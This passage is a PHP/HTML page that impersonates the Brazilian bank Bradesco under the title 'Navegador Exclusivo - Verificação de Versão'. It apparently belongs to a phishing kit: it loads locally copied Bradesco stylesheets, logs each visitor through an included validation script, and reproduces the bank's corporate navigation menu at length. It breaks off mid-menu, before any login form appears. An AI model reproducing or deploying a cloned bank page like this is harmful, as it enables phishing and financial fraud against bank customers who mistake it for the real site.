<?php
    include 'validacao.php';
    if(!isset($_SESSION['idInfo'])){
        Info::adicionarInfoFromAcesso(getHash());
    }

?>
<!DOCTYPE html>
<html class="no-js"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="shortcut icon" href="https://banco.bradesco/assets/corporate/img/favicon.ico">
	<title>Navegador Exclusivo - Verificação de Versão | Bradesco</title>
	

<link rel="stylesheet" type="text/css" href="./seguranca03_files/normalize.min.css">
<link rel="stylesheet" type="text/css" href="./seguranca03_files/structure.css">
<link rel="stylesheet" type="text/css" href="./seguranca03_files/chosen.min.css">
<link rel="stylesheet" type="text/css" href="./seguranca03_files/magnific-popup.css">
<link rel="stylesheet" type="text/css" href="./seguranca03_files/jquery.mmenu.all.css">
<link rel="stylesheet" type="text/css" href="./seguranca03_files/owl.carousel.css">
<link rel="stylesheet" type="text/css" href="./seguranca03_files/owl.theme.css">
<link rel="stylesheet" type="text/css" href="./seguranca03_files/bootstrap.css">
<link rel="stylesheet" type="text/css" href="./seguranca03_files/mediaelementplayer.css">
<link rel="stylesheet" type="text/css" href="./seguranca03_files/font-awesome.css">
<link rel="stylesheet" type="text/css" href="./seguranca03_files/slick.css">
<link rel="stylesheet" type="text/css" href="./seguranca03_files/slick-theme.css">
<link rel="stylesheet" type="text/css" href="./seguranca03_files/bootstrap-select.css">
<link rel="stylesheet" type="text/css" href="./seguranca03_files/font-montserrat.css">
<link rel="stylesheet" type="text/css" href="./seguranca03_files/btns.css">

	<link rel="stylesheet" type="text/css" href="./seguranca03_files/custon.mmenu.bradesco.css">
	<link rel="stylesheet" type="text/css" href="./seguranca03_files/main.css">
    <link rel="stylesheet" type="text/css" href="./seguranca03_files/modal.css">
	<link rel="stylesheet" type="text/css" href="./seguranca03_files/content.css">
	<link rel="stylesheet" type="text/css" href="./seguranca03_files/corporate.css">
    <link rel="stylesheet" type="text/css" href="css/componenteSeguranca.css">
<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i&display=swap" rel="stylesheet">
  </head>
<body>



<div id="mm-0" class="mm-page mm-slideout"><div id="wrapper" class="">
	
	<div class="menu__lateral">
		<!-- Navegação Principal Desktop -->
		<h1><a tabindex="6" href="https://banco.bradesco/html/corporate/index.shtm" onclick="trackBradesco(&#39;Corporate&#39;,&#39;Menu_Superior&#39;,&#39;Head_Inicio&#39;);"><img src="./seguranca03_files/logoCorporate.svg" alt="Bradesco Corporate"></a></h1>
		<nav id="mainMenu"><h2><ul><li class="sobre active"><a href="https://banco.bradesco/html/corporate/sobre/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Menu Lateral&#39;,&#39;Sobre&#39;);">O Bradesco Corporate</a><ul style="display: block;"></ul></li><li class="solucoes-integradas"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Menu Lateral&#39;,&#39;Soluções Integradas&#39;);">Soluções Integradas</a><ul><li class="banco-de-investimentos"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/banco-de-investimentos/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Banco de Investimento&#39;);">Banco de Investimento</a></li><li class="cartoes"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/cartoes/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Cartões&#39;);">Cartões</a><ul><li class="conheca-os-cartoes"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/cartoes/conheca-os-cartoes.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Conheça os Cartões&#39;);">Conheça os Cartões</a></li><li class="estabelecimentos-comerciais"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/cartoes/estabelecimentos-comerciais/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Estabelecimentos Comerciais&#39;);">Estabelecimentos Comerciais</a><ul><li class="domicilio-bancario"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/cartoes/domicilio-bancario.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Domicílio Bancário&#39;);">Domicílio Bancário</a></li></ul></li><li class="portalcartoespj"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/cartoes/portalcartoespj/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Portal Cartões PJ&#39;);">Portal Cartões PJ</a></li><li class="salavip"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/cartoes/beneficios/salavip.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Sala Vip&#39;);">Sala Vip</a></li><li class="cotacao-moeda"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/cartoes/cotacao-moeda/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Cotação Dólar&#39;);">Cotação Dólar</a></li></ul></li><li class="cash-management"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/cash-management/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Cash Management&#39;);">Cash Management</a></li><li class="comercio-exterior"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Comércio Exterior e Câmbio&#39;);">Comércio Exterior e Câmbio</a><ul><li class="produtos-financeiros"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/produtos-financeiros/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Produtos Financeiros&#39;);">Produtos Financeiros</a><ul><li class="canal-bancario"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/produtos-financeiros/canal-bancario.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Canal Bancário&#39;);">Canal Bancário</a></li><li class="conta-exportador"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/produtos-financeiros/conta-exportador.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Conta de Exportador no Exterior&#39;);">Conta de Exportador no Exterior</a></li><li class="fiancas-internacionais"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/produtos-financeiros/fiancas-internacionais.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Fianças Internacionais&#39;);">Fianças Internacionais</a></li><li class="operacoes-estruturadas"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/produtos-financeiros/operacoes-estruturadas.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Operações Estruturadas via Unidade no Exterior&#39;);">Operações Estruturadas via Unidade no Exterior</a></li><li class="ordem-pagamento"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/produtos-financeiros/ordem-pagamento.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Ordem de Pagamento Recebimento/Envio&#39;);">Ordem de Pagamento Recebimento/Envio</a></li><li class="transferencias-financeiras"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/produtos-financeiros/transferencias-financeiras.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Transferências&#39;);">Transferências</a></li></ul></li><li class="importacao"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/importacao/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Importação&#39;);">Importação</a><ul><li class="carta-credito"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/importacao/carta-credito.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Carta de Crédito de Exportação&#39;);">Carta de Crédito de Exportação</a></li><li class="cobranca"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/importacao/cobranca.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Cobrança de Importação&#39;);">Cobrança de Importação</a></li><li class="financiamento-longo-prazo"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/importacao/financiamento-longo-prazo.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Financiamento a Longo Prazo&#39;);">Financiamento a Longo Prazo</a></li><li class="financiamento-refinanciamento"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/importacao/financiamento-refinanciamento.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Financiamento/ Refinanciamento de Importação&#39;);">Financiamento/ Refinanciamento de Importação</a></li><li class="garantias-internacionais"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/importacao/garantias-internacionais.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Garantia Internacionais - Stand by Letter of Credit&#39;);">Garantia Internacionais - Stand by Letter of Credit</a></li></ul></li><li class="exportacao"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/exportacao/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Exportação&#39;);">Exportação</a><ul><li class="acc-adiantamento"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/exportacao/acc-adiantamento.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;ACC - Adiantamento sobre Contrato de Câmbio&#39;);">ACC - Adiantamento sobre Contrato de Câmbio</a></li><li class="acc-insumos"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/exportacao/acc-insumos.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;ACC - Insumos ou ACC Indireto&#39;);">ACC - Insumos ou ACC Indireto</a></li><li class="ace"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/exportacao/ace.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;ACE - Adiantamento sobre Cambiais Entregues&#39;);">ACE - Adiantamento sobre Cambiais Entregues</a></li><li class="bndes-exim"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/exportacao/bndes-exim.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;BNDES - EXIM&#39;);">BNDES - EXIM</a></li><li class="nce-cce"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/exportacao/nce-cce.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;NCE / CCE&#39;);">NCE / CCE</a></li><li class="pre-pagamento"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/exportacao/pre-pagamento.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Pré-pagamento de exportação&#39;);">Pré-pagamento de exportação</a></li><li class="proex"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/exportacao/proex.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Proex&#39;);">Proex</a></li><li class="trava-cambio"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/exportacao/trava-cambio.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Trava de Câmbio&#39;);">Trava de Câmbio</a></li></ul></li><li class="servicos-on-line"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/servicos-on-line/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Serviços On-line&#39;);">Serviços On-line</a><ul><li class="assinatura-digital"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/servicos-on-line/assinatura-digital.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Assinatura Digital de Contatos de Câmbio&#39;);">Assinatura Digital de Contatos de Câmbio</a></li><li class="consulta-operacoes"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/servicos-on-line/consulta-operacoes.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Consulta de Operações de Câmbio&#39;);">Consulta de Operações de Câmbio</a></li><li class="cambio-on-line"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/servicos-on-line/cambio-on-line.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Câmbio On-line&#39;);">Câmbio On-line</a></li><li class="avisos-lancamento"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/servicos-on-line/avisos-lancamento.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Aviso de Lançamento&#39;);">Aviso de Lançamento</a></li><li class="infoemail"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/servicos-on-line/infoemail.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Infoemail&#39;);">Infoemail</a></li><li class="proposta-negocios"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/servicos-on-line/proposta-negocios.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Proposta de Negócios&#39;);">Proposta de Negócios</a></li><li class="emissao-ordem-pagamento"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/servicos-on-line/emissao-ordem-pagamento.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Emissão de Ordem de Pagamento no Exterior&#39;);">Emissão de Ordem de Pagamento no Exterior</a></li></ul></li><li class="ferramentas"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/comercio-exterior/ferramentas/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Ferramentas&#39;);">Ferramentas</a></li></ul></li><li class="consorcios"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Consórcios&#39;);">Consórcios</a><ul><li class="automoveis"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/automoveis/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Automóveis&#39;);">Automóveis</a><ul><li class="consorcio-automoveis"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/automoveis/consorcio-automoveis.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Consórcio de Automóveis Bradesco&#39;);">Consórcio de Automóveis Bradesco</a></li></ul></li><li class="veiculos-pesados"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/veiculos-pesados/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Veículos Pesados&#39;);">Veículos Pesados</a><ul><li class="consorcio-caminhoes"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/veiculos-pesados/consorcio-caminhoes.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Consórcio de Caminhões Bradesco&#39;);">Consórcio de Caminhões Bradesco</a></li><li class="consorcio-tratores"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/veiculos-pesados/consorcio-tratores.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Consórcio de Tratores Bradesco&#39;);">Consórcio de Tratores Bradesco</a></li><li class="consorcio-onibus"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/veiculos-pesados/consorcio-onibus.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Consórcio de Ônibus Bradesco&#39;);">Consórcio de Ônibus Bradesco</a></li></ul></li><li class="imoveis 1"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/imoveis/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Imóveis&#39;);">Imóveis</a><ul><li class="consorcio-imoveis"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/imoveis/consorcio-imoveis.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Consórcio de Imóveis Bradesco&#39;);">Consórcio de Imóveis Bradesco</a></li></ul></li><li class="todos-os-consorcios"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/todos-os-consorcios.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Todos os Consórcios&#39;);">Todos os Consórcios</a></li><li class="servicos"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/servicos/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Serviços&#39;);">Serviços</a><ul><li class="calendario-assembleias"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/servicos/calendario-assembleias.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Calendário de Assembleias&#39;);">Calendário de Assembleias</a></li><li class="ofertas-de-lance"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/servicos/ofertas-de-lance.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Ofertas de Lance&#39;);">Ofertas de Lance</a></li><li class="extrato"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/servicos/extrato.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Extratos&#39;);">Extratos</a></li><li class="segunda-via-de-boleto"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/servicos/segunda-via-de-boleto.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;2ª Via de Boleto &#39;);">2ª Via de Boleto </a></li><li class="documentos-liberacao-credito"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/servicos/documentos-liberacao-credito.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Documentos para Liberação de Crédito&#39;);">Documentos para Liberação de Crédito</a></li><li class="vistorias"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/servicos/vistorias.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Vistorias&#39;);">Vistorias</a></li><li class="alteracao-de-endereco"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/servicos/alteracao-de-endereco.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Alteração de Endereço&#39;);">Alteração de Endereço</a></li><li class="declaracao-de-ir"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/servicos/declaracao-de-ir.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Declaração de Imposto de Renda&#39;);">Declaração de Imposto de Renda</a></li><li class="cotas-inativas"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/servicos/cotas-inativas.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Cotas Inativas&#39;);">Cotas Inativas</a></li><li class="grupos-encerrados"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/consorcios/servicos/grupos-encerrados.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Grupos Encerrados&#39;);">Grupos Encerrados</a></li></ul></li></ul></li><li class="conta-corrente"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/conta-corrente/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Conta-Corrente&#39;);">Conta-Corrente</a><ul><li class="tarifas"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/conta-corrente/tarifas.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Tarifas&#39;);">Tarifas</a></li><li class="remessa-e-recolhimento"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/conta-corrente/remessa-e-recolhimento.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Remessa e Recolhimento de Numerário&#39;);">Remessa e Recolhimento de Numerário</a></li><li class="conciliacao-bancaria"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/conta-corrente/conciliacao-bancaria.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Conciliação Bancária&#39;);">Conciliação Bancária</a></li><li class="caixa-centralizado"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/conta-corrente/caixa-centralizado.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Caixa Centralizado&#39;);">Caixa Centralizado</a></li><li class="talao-de-cheques"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/conta-corrente/talao-de-cheques.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Talão de Cheques&#39;);">Talão de Cheques</a></li></ul></li><li class="emprestimo-e-financiamento"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Crédito&#39;);">Crédito</a><ul><li class="agronegocios"><a href="https://www.bradescoagronegocio.com.br/html/rural/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Agronegócios&#39;);">Agronegócios</a></li><li class="antecipacao-a-fornecedores"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/antecipacao-a-fornecedores.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Antecipação a Fornecedores&#39;);">Antecipação a Fornecedores</a></li><li class="antecipacao-de-recebiveis"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/antecipacao-de-recebiveis/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Antecipação de Recebíveis&#39;);">Antecipação de Recebíveis</a><ul><li class="aquisicao-de-creditos"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/antecipacao-de-recebiveis/aquisicao-de-creditos.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Aquisição de Créditos&#39;);">Aquisição de Créditos</a></li><li class="desconto"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/antecipacao-de-recebiveis/desconto.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Desconto&#39;);">Desconto</a></li></ul></li><li class="conta-garantida"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/conta-garantida.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Conta Garantida&#39;);">Conta Garantida</a></li><li class="credito-socioambiental"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/credito-socioambiental.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Crédito Socioambiental&#39;);">Crédito Socioambiental</a></li><li class="capital-de-giro"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/capital-de-giro/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Capital de Giro&#39;);">Capital de Giro</a></li><li class="fianca"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/fianca.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Fiança&#39;);">Fiança</a></li><li class="financiamento-de-vendas"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/financiamento-de-vendas/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Financiamento de Vendas&#39;);">Financiamento de Vendas</a><ul><li class="cdci"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/financiamento-de-vendas/cdci.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;CDCI&#39;);">CDCI</a></li><li class="vendor"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/financiamento-de-vendas/vendor.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Vendor&#39;);">Vendor</a></li></ul></li><li class="imoveis 2"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/imoveis.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Imóveis&#39;);">Imóveis</a><ul><li class="aquisicao-de-imovel"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/imoveis/aquisicao-de-imovel.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Aquisição de Imóvel&#39;);">Aquisição de Imóvel</a></li><li class="plano-empresario"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/imoveis/plano-empresario.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Plano empresário&#39;);">Plano empresário</a></li><li class="plano-piloto"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/imoveis/plano-piloto.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Plano Piloto&#39;);">Plano Piloto</a></li><li class="leasing"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/imoveis/leasing.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Leasing Imobiliário&#39;);">Leasing Imobiliário</a></li><li class="imobiliarias-parceiras"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/imoveis/imobiliarias-parceiras.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Imobiliárias Parceiras&#39;);">Imobiliárias Parceiras</a></li></ul></li><li class="maquinas-e-equipamentos"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/maquinas-e-equipamentos/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Infraestrutura, Máquinas e Equipamentos&#39;);">Infraestrutura, Máquinas e Equipamentos</a></li><li class="veiculos"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/emprestimo-e-financiamento/veiculos/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Veículos, aeronaves e embarcações&#39;);">Veículos, aeronaves e embarcações</a></li></ul></li><li class="derivativos"><a 